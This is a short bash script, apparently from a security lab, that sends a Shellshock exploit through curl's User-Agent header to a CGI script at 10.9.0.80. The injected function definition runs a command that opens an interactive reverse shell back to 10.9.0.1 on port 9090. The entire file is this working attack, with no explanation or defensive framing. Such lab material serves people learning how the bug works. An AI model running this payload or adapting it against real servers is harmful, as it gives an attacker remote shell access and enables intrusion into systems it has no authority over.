#!/bin/bash
curl -A "() { echo hello wdnmd;}; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" 10.9.0.80/cgi-bin/vul.cgi
